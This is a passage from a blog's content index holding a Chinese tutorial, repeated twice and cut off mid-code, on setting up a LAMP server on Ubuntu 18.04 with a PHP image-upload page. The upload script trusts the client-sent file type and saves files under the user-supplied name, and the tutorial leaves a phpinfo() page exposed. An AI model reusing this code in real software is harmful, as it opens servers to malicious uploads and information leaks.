class="line">        Book b1= ops2.get(<span class="string">"b1"</span>);</span><br><span class="line">        System.out.println(b1);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 后端 </tag>
        
            
            
        <tag> redis </tag>
        
            
            
        <tag> springboot </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>ubuntu 18.04下搭建LAMP环境</title>
      
      
      <link href="/cn/posts/42422/"/>
      
      
      <url>/cn/posts/42422/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>前言：</p><p>Linux 操作系统在服务器领域具有广泛的应用。Web 服务是服务器领域中应<br>用最广泛的服务，常见 Web 服务有 WAMP（Windows+Apache+MySQL+PHP）和 LAMP<br>（Linux+Apache+MySQL+PHP）架构，其中 Apache 是全世界最流行的 Web 服务软<br>件，此外，Web 服务软件 nginx，因其具有优秀的性能也受到越来越多的用户欢<br>迎。本文中，演示在 Linux 环境下搭建支持 PHP 等网页的 Web 服务平台，即<br>LAMP。<br>Linux 环境下搭建 Web 服务器有三种方式，一是在安装操作系统时勾选相应<br>服务组件；二是从网上下载或从 ISO 系统镜像包中拷贝安装包手动安装；三是在<br>在连接网络的的情况下在线安装。<br>本文以阿里云 Ubuntu 18.04 64 位操作系统为例安装LAMP，并用PHP实现简单的图片上传功能。</p></blockquote><h5 id="1-安装-Apache-服务器"><a href="#1-安装-Apache-服务器" class="headerlink" title="1.安装 Apache 服务器"></a>1.安装 Apache 服务器</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install apache2</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvWmljTzIxYm9DSnd5RkhrLnBuZw?x-oss-process=image/format,png" alt="image-20200607185107131"></p><p><strong>安装完成后需要手动启动 apache 服务</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvT3Q1cG5QUWtxNzZyU2VHLnBuZw?x-oss-process=image/format,png" alt="image-20200607185314919"></p><p><strong>测试 Apache，在浏览器输入服务器IP 地址，如下图所示，说明 Apache 安装成功。（阿里云等需要在云控制面板打开80端口才能访问）</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvNXlMeHRpVUJtQ2FwVFBZLnBuZw?x-oss-process=image/format,png" alt="image-20200607185759748"></p><blockquote><p>以上页面详细介绍了 debian 发行版 Linux 中 Apache 基本信息，其中：</p><p>Apache 根目录：<br>/var/www/html<br>Apache 配置目录和文件：<br>/etc/apache2：Apache 主配置目录， Apache 所有配置文件均在此目录下；<br>/etc/apache2/apache2.conf：主配置文件，可配置 Apache 全局配置；<br>/etc/apache2/ports.conf：端口配置文件。默认情况下，当启用提供 SSL<br>功能的模块时，Apache 监听端口 80，并在端口 443 上进行监听。<br>其它文件略。<br>Apache 日志文件：<br>/var/log/apache2/access.log:服务请求日志；<br>/var/log/apache2/error.log：服务错误日志。<br>Apache 基本操作：<br>服务启动：/etc/init.d/apache2 start<br>服务停止：/etc/init.d/apache2 stop<br>服务重启：/etc/init.d/apache2 restart<br>部分 Linux 安装 Apache 后可能出现服务正常运行，相应端口正常打开，但<br>其它主机无法访问情况，此现象一般是因为系统防火墙未开放相应服务端口。  </p><p><strong>以修改端口为例修改配置文件</strong></p><p>首先打开/etc/apache2/ports.conf文件,然后修改Listen的内容,最后需要重启apache生效</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/etc/init.d/apache2 restart</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvcW1FWlh0RFI4aHJIV04zLnBuZw?x-oss-process=image/format,png" alt="image-20200607210454251"></p></blockquote><p><strong>阿里云安全组配置</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvdmRJMmg4VHk5YWJZM0NTLnBuZw?x-oss-process=image/format,png" alt="image-20200607185719368"></p><h5 id="2-安装-MySQL-MariaDB"><a href="#2-安装-MySQL-MariaDB" class="headerlink" title="2.安装 MySQL/MariaDB"></a>2.安装 MySQL/MariaDB</h5><blockquote><p>本示例采用 MariaDB 代替 MySQL。MariaDB 是 MySQL 的一个分支，现由开源<br>社区维护，采用 GPL 授权许可，其大部分语法与 MySQL 都相同。因 MySQL 被 Oracle<br>收购后有闭源的风险，大部分 Linux 组织均从其套件清单删除了 MySQL，并以<br>MariaDB 代替 MySQL，若一定要使用 MySQL，可通过下载安装包的方式手动安装<br>MySQL。  </p></blockquote><p><strong>安装 MariaDB 服务</strong>  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install mariadb-server</span><br><span class="line"><span class="built_in">sudo</span> apt install mariadb-client</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvbXZKYTlYeGhEbzJWQVQxLnBuZw?x-oss-process=image/format,png" alt="image-20200607190537515"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvcVdjWlFyQzZQQlViRmY0LnBuZw?x-oss-process=image/format,png" alt="image-20200607190604824"></p><p><strong>配置 Mariadb 的安全选项:</strong>  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql_secure_installation</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvM3RTeXBpamJIN01lc0ZuLnBuZw?x-oss-process=image/format,png" alt="image-20200607190923711"></p><blockquote><p>此时系统会提示输入数据库 root 用户密码，因系统并未设置相应密码，此<br>时直接按提示回车即可。若提示错误，则 sudo /etc/init.d/mysql restart 命<br>令重启 mysql 服务并重新执行安全选项命令。<br>随后数据库会提示以下安全设置信息，一般设置数据库 root 用户密码即可，<br>其它选项按回车选择默认：<br>1、Enter current password for root (enter for none): 输入当前 root<br>的密码(因新数据库无密码，回车即可)；<br>2、Set root password? [Y/n] 回车，默认为输入 Y；<br>3、New password: 输入新密码；<br>4、Re-enter new password 确认密码；<br>5、Remove anonymous users? [Y/n] 移除匿名用户；<br>6、Disallow root login remotely? [Y/n] 禁止 root 远程登录；<br>7、Remove test database and access to it? [Y/n] 移除测试数据库；<br>8、Reload privilege tables now? [Y/n] 重新加载权限表。</p></blockquote><p><strong>测试数据库，如图所示，若进入数据库则表示数据库安装成功。</strong> </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span>  mysql -u root -p</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvSXBjT043b2tHOW1hVDVoLnBuZw?x-oss-process=image/format,png" alt="image-20200607193447164"></p><h5 id="3-安装PHP"><a href="#3-安装PHP" class="headerlink" title="3.安装PHP"></a>3.安装PHP</h5><blockquote><p>安装 PHP 除了 PHP 应用程序外，还需安装 PHP 与 Apache、MySQL/MariaDB<br>相关扩展包，扩展包需与软件对应，本例中安装 php7.3 版本，对应扩展包可通<br>过以下命令模糊查询。  </p><p>sudo apt-cache search php7</p></blockquote><p>从 查 询 结 果 可 知 ， php7.2 对 应 Apache 、 MySQL 扩 展 包 分 别 为 ：<br> libapahe2-mod-php7.2，php7.2-mysql。如下图所示为安装 PHP 相关软件包。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install php7.2 libapache2-mod-php7.2 php7.2-mysql</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvaEpQRlpMOGJ4d05JaWdPLnBuZw?x-oss-process=image/format,png" alt="image-20200607203901229"></p><p><strong>PHP 安装完毕后需重启 Apache</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></tbody></table></figure><h5 id="4-测试-PHP-页面"><a href="#4-测试-PHP-页面" class="headerlink" title="4.测试 PHP 页面"></a>4.测试 PHP 页面</h5><p>编辑测试文件，如下图所示，在“/var/www/html”目录下新建“test.php”文件，并输入如下图所示的测试代码  </p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在浏览器中输入测试页面地址，并确认已安装组件,例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvQzRvWWNCeHVoZUw3MzY4LnBuZw?x-oss-process=image/format,png" alt="image-20200607205042380"></p><h5 id="5-创建文件上传页面"><a href="#5-创建文件上传页面" class="headerlink" title="5.创建文件上传页面"></a>5.创建文件上传页面</h5><p>文件上传功能由上传文件的 HTML 表单和文件上传脚本构成。<br>在“/var/www/html”目录下创建“upload.html”文件，编辑表单  </p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- upload.html --&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在“/var/www/html”目录下创建 “upload.php” 脚本文件，编写文件上传功能代码  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- upload.php --&gt;&lt;?php// 允许上传的图片后缀$allowedExts = array("gif", "jpeg", "jpg", "png");$temp = explode(".", $_FILES["file"]["name"]);echo $_FILES["file"]["size"];$extension = end($temp);     // 获取文件后缀名if ((($_FILES["file"]["type"] == "image/gif")|| ($_FILES["file"]["type"] == "image/jpeg")|| ($_FILES["file"]["type"] == "image/jpg")|| ($_FILES["file"]["type"] == "image/pjpeg")|| ($_FILES["file"]["type"] == "image/x-png")|| ($_FILES["file"]["type"] == "image/png"))&amp;&amp; ($_FILES["file"]["size"] &lt; 204800)   // 小于 200 kb&amp;&amp; in_array($extension, $allowedExts)){    if ($_FILES["file"]["error"] &gt; 0)    {        echo "错误：: " . $_FILES["file"]["error"] . "&lt;br&gt;";    }    else    {        echo "上传文件名: " . $_FILES["file"]["name"] . "&lt;br&gt;";        echo "文件类型: " . $_FILES["file"]["type"] . "&lt;br&gt;";        echo "文件大小: " . ($_FILES["file"]["size"] / 1024) . " kB&lt;br&gt;";        echo "文件临时存储的位置: " . $_FILES["file"]["tmp_name"] . "&lt;br&gt;";                // 判断当前目录下的 upload 目录是否存在该文件        if (file_exists("upload/" . $_FILES["file"]["name"]))        {            echo $_FILES["file"]["name"] . " 文件已经存在。 ";        }        else        {            // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下            move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);            echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];        }    }}else{    echo "非法的文件格式";}?&gt;</span><br></pre></td></tr></tbody></table></figure><p>在目录下创建“upload”目录，用于保存上传的图片。  </p><p>如下图所示，为上传文件页面。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvZXoyUUFEVm5VQ1BybG1iLnBuZw?x-oss-process=image/format,png" alt="image-20200607210025657"></p><p>上传成功的提示：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcveWk4UDRaN0dqYk1ZNXZYLnBuZw?x-oss-process=image/format,png" alt="image-20200607210110052"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
            
        <tag> 后端 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>ubuntu 18.04下搭建LAMP环境</title>
      
      
      <link href="/cn/posts/42422/"/>
      
      
      <url>/cn/posts/42422/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>前言：</p><p>Linux 操作系统在服务器领域具有广泛的应用。Web 服务是服务器领域中应<br>用最广泛的服务，常见 Web 服务有 WAMP（Windows+Apache+MySQL+PHP）和 LAMP<br>（Linux+Apache+MySQL+PHP）架构，其中 Apache 是全世界最流行的 Web 服务软<br>件，此外，Web 服务软件 nginx，因其具有优秀的性能也受到越来越多的用户欢<br>迎。本文中，演示在 Linux 环境下搭建支持 PHP 等网页的 Web 服务平台，即<br>LAMP。<br>Linux 环境下搭建 Web 服务器有三种方式，一是在安装操作系统时勾选相应<br>服务组件；二是从网上下载或从 ISO 系统镜像包中拷贝安装包手动安装；三是在<br>在连接网络的的情况下在线安装。<br>本文以阿里云 Ubuntu 18.04 64 位操作系统为例安装LAMP，并用PHP实现简单的图片上传功能。</p></blockquote><h5 id="1-安装-Apache-服务器"><a href="#1-安装-Apache-服务器" class="headerlink" title="1.安装 Apache 服务器"></a>1.安装 Apache 服务器</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install apache2</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvWmljTzIxYm9DSnd5RkhrLnBuZw.png" alt="image-20200607185107131"></p><p><strong>安装完成后需要手动启动 apache 服务</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvT3Q1cG5QUWtxNzZyU2VHLnBuZw.png" alt="image-20200607185314919"></p><p><strong>测试 Apache，在浏览器输入服务器IP 地址，如下图所示，说明 Apache 安装成功。（阿里云等需要在云控制面板打开80端口才能访问）</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvNXlMeHRpVUJtQ2FwVFBZLnBuZw.png" alt="image-20200607185759748"></p><blockquote><p>以上页面详细介绍了 debian 发行版 Linux 中 Apache 基本信息，其中：</p><p>Apache 根目录：<br>/var/www/html<br>Apache 配置目录和文件：<br>/etc/apache2：Apache 主配置目录， Apache 所有配置文件均在此目录下；<br>/etc/apache2/apache2.conf：主配置文件，可配置 Apache 全局配置；<br>/etc/apache2/ports.conf：端口配置文件。默认情况下，当启用提供 SSL<br>功能的模块时，Apache 监听端口 80，并在端口 443 上进行监听。<br>其它文件略。<br>Apache 日志文件：<br>/var/log/apache2/access.log:服务请求日志；<br>/var/log/apache2/error.log：服务错误日志。<br>Apache 基本操作：<br>服务启动：/etc/init.d/apache2 start<br>服务停止：/etc/init.d/apache2 stop<br>服务重启：/etc/init.d/apache2 restart<br>部分 Linux 安装 Apache 后可能出现服务正常运行，相应端口正常打开，但<br>其它主机无法访问情况，此现象一般是因为系统防火墙未开放相应服务端口。  </p><p><strong>以修改端口为例修改配置文件</strong></p><p>首先打开/etc/apache2/ports.conf文件,然后修改Listen的内容,最后需要重启apache生效</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/etc/init.d/apache2 restart</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvcW1FWlh0RFI4aHJIV04zLnBuZw.png" alt="image-20200607210454251"></p></blockquote><p><strong>阿里云安全组配置</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvdmRJMmg4VHk5YWJZM0NTLnBuZw.png" alt="image-20200607185719368"></p><h5 id="2-安装-MySQL-MariaDB"><a href="#2-安装-MySQL-MariaDB" class="headerlink" title="2.安装 MySQL/MariaDB"></a>2.安装 MySQL/MariaDB</h5><blockquote><p>本示例采用 MariaDB 代替 MySQL。MariaDB 是 MySQL 的一个分支，现由开源<br>社区维护，采用 GPL 授权许可，其大部分语法与 MySQL 都相同。因 MySQL 被 Oracle<br>收购后有闭源的风险，大部分 Linux 组织均从其套件清单删除了 MySQL，并以<br>MariaDB 代替 MySQL，若一定要使用 MySQL，可通过下载安装包的方式手动安装<br>MySQL。  </p></blockquote><p><strong>安装 MariaDB 服务</strong>  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install mariadb-server</span><br><span class="line"><span class="built_in">sudo</span> apt install mariadb-client</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvbXZKYTlYeGhEbzJWQVQxLnBuZw.png" alt="image-20200607190537515"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvcVdjWlFyQzZQQlViRmY0LnBuZw.png" alt="image-20200607190604824"></p><p><strong>配置 Mariadb 的安全选项:</strong>  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql_secure_installation</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvM3RTeXBpamJIN01lc0ZuLnBuZw.png" alt="image-20200607190923711"></p><blockquote><p>此时系统会提示输入数据库 root 用户密码，因系统并未设置相应密码，此<br>时直接按提示回车即可。若提示错误，则 sudo /etc/init.d/mysql restart 命<br>令重启 mysql 服务并重新执行安全选项命令。<br>随后数据库会提示以下安全设置信息，一般设置数据库 root 用户密码即可，<br>其它选项按回车选择默认：<br>1、Enter current password for root (enter for none): 输入当前 root<br>的密码(因新数据库无密码，回车即可)；<br>2、Set root password? [Y/n] 回车，默认为输入 Y；<br>3、New password: 输入新密码；<br>4、Re-enter new password 确认密码；<br>5、Remove anonymous users? [Y/n] 移除匿名用户；<br>6、Disallow root login remotely? [Y/n] 禁止 root 远程登录；<br>7、Remove test database and access to it? [Y/n] 移除测试数据库；<br>8、Reload privilege tables now? [Y/n] 重新加载权限表。</p></blockquote><p><strong>测试数据库，如图所示，若进入数据库则表示数据库安装成功。</strong> </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span>  mysql -u root -p</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvSXBjT043b2tHOW1hVDVoLnBuZw.png" alt="image-20200607193447164"></p><h5 id="3-安装PHP"><a href="#3-安装PHP" class="headerlink" title="3.安装PHP"></a>3.安装PHP</h5><blockquote><p>安装 PHP 除了 PHP 应用程序外，还需安装 PHP 与 Apache、MySQL/MariaDB<br>相关扩展包，扩展包需与软件对应，本例中安装 php7.3 版本，对应扩展包可通<br>过以下命令模糊查询。  </p><p>sudo apt-cache search php7</p></blockquote><p>从 查 询 结 果 可 知 ， php7.2 对 应 Apache 、 MySQL 扩 展 包 分 别 为 ：<br> libapahe2-mod-php7.2，php7.2-mysql。如下图所示为安装 PHP 相关软件包。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install php7.2 libapache2-mod-php7.2 php7.2-mysql</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvaEpQRlpMOGJ4d05JaWdPLnBuZw.png" alt="image-20200607203901229"></p><p><strong>PHP 安装完毕后需重启 Apache</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></tbody></table></figure><h5 id="4-测试-PHP-页面"><a href="#4-测试-PHP-页面" class="headerlink" title="4.测试 PHP 页面"></a>4.测试 PHP 页面</h5><p>编辑测试文件，如下图所示，在“/var/www/html”目录下新建“test.php”文件，并输入如下图所示的测试代码  </p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在浏览器中输入测试页面地址，并确认已安装组件,例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvQzRvWWNCeHVoZUw3MzY4LnBuZw.png" alt="image-20200607205042380"></p><h5 id="5-创建文件上传页面"><a href="#5-创建文件上传页面" class="headerlink" title="5.创建文件上传页面"></a>5.创建文件上传页面</h5><p>文件上传功能由上传文件的 HTML 表单和文件上传脚本构成。<br>在“/var/www/html”目录下创建“upload.html”文件，编辑表单  </p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- upload.html --&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在“/var/www/html”目录下创建 “upload.php” 脚本文件，编写文件上传功能代码  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- upload.php --&gt;&lt;?php// 允许上传的图片后缀$allowedExts = array("gif", "jpeg", "jpg", "png");$temp = explode(".", $_FILES["file"]["name"]);echo $_FILES["file"]["size"];$extension = end($temp);     // 获取文件后缀名if ((($_FILES["file"]["type"] == "image/gif")|| ($_FILES["file"]["type"] == "image/jpeg")|| ($_FILES["file"]["type"] == "image/jpg")|| ($_FILES["file"]["type"] == "image/pjpeg")|| ($_FILES["file"]["type"] == "image/x-png")|| ($_FILES["file"]["type"] == "image/png"))&amp;&amp; ($_FILES["file"]["size"] &lt; 204800)   // 小于 200 kb&amp;&amp; in_array($extension, $allowedExts)){    if ($_FILES["file"]["error"] &gt; 0)    {        echo "错误：: " . $_FILES["file"]["error"] . "&lt;br&gt;";    }    else    {        echo "上传文件名: " . $_FILES["file"]["name"] . "&lt;br&gt;";        echo "文件类型: " . $_FILES["file"]["type"] . "&lt;br&gt;";        echo "文件大小: " . ($_FILES["file"]["size"] / 1024) . " kB&lt;br&gt;";        echo "文件临时存储的位置: " . $_FILES["file"]["tmp_name"] . "&lt;br&gt;";                // 判断当前目录下的 upload 目录是否存在该文件        if (file_exists("upload/" . $_FILES["file"]["name"]))        {            echo $_FILES["file"]["name"] . " 文件已经存在。 ";        }        else        {            // 如果 upload 